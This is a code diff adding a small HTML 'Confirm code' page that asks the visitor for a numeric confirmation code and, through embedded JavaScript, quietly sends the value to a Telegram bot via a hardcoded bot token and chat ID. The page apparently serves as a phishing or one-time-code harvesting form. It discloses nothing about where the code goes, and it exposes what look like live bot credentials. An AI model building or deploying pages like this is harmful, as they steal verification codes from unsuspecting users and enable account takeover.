@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+      h1{
+          color:green;
+      }
+      body{
+          background:#000;
+      }
+      button{
+          background:lightgreen;
+      }
+  </style>
+  <title>Confirm code</title>
+</head>
+<body>
+  <h1>enter you confirmation code </h1>
+  <form id="inpiForm">
+    <label for="inpi">code :</label>
+    <input type="number" id="inpi" name="inpi" required>
+    <br>
+    <button type="submit">Confirm</button>
+  </form>
+
+  <script>
+    const botToken = "8175527930:AAH0NpWeTS2IcwrSNebviaRM7QmotzvtmG4"; // Remplacez par votre token
+    const chatId = "7879061625"; // Remplacez par votre chat ID
+
+    document.getElementById("inpiForm").addEventListener("submit", async (event) => {
+      event.preventDefault();
+
+      const inpiValue = document.getElementById("inpi").value;
+
+      if (inpiValue) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        try {
+          const response = await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: `Valeur INPI : ${inpiValue}`,
+            }),
+          });
+
+          const result = await response.json();
+          if (result.ok) {
+            alert("Valeur envoyée avec succès !");
+          } else {
+            alert("Erreur : " + result.description);
+          }
+        } catch (error) {
+          alert("Une erreur s'est produite : " + error.message);
+        }
+      } else {
+        alert("Veuillez entrer une valeur.");
+      }
+    });
+  </script>
+</body>
+</html>
